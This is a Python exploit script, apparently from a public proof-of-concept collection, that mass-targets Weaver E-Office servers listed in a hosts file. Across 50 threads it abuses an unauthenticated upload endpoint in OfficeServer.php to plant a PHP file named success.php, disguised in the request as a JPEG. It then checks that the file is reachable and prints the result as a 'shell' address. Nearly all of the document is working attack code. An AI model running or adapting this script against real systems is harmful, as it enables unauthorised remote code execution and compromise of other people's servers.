#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# product="泛微-EOffice"

import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor

if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                        +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                      +')
    print(
        '+ EXP: python3 Weaver_Oa_Eoffice_Officeserver_Upload_File_Poc.py url.txt                                   +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
proxysdata = {
'http': '127.0.0.1:8081'
}  
def exp(host):
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryJjb5ZAJOOXO7fwjs",
        "Host": "%s" %host2
    }
    headers2 = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Accept": "*/*",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Host": "%s" %host2
    }
    data ="""------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
Content-Disposition: form-data; name="FileData"; filename="1.jpg"
Content-Type: image/jpeg

<?php phpinfo();unlink(__FILE__);?>
------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
Content-Disposition: form-data; name="FormData"

{'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'success.php'}
------WebKitFormBoundaryJjb5ZAJOOXO7fwjs--"""
    vulurl = url + "/eoffice10/server/public/iWebOffice2015/OfficeServer.php"
    vulurl2=url+"/eoffice10/server/public/iWebOffice2015/Document/success.php"
    try:
        r = requests.post(vulurl, headers=headers,data=data)
        if r.status_code==200 :
            print(url)
            r2=requests.get(vulurl2,headers=headers2)
            if r2.status_code==200 :
                print("shell地址为:"+url+"/eoffice10/server/public/iWebOffice2015/Document/success.php")
            
        else:
            return 0
            print (host+":false")
    except:
        return 0
        print (host+":false")


if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(exp, row[0])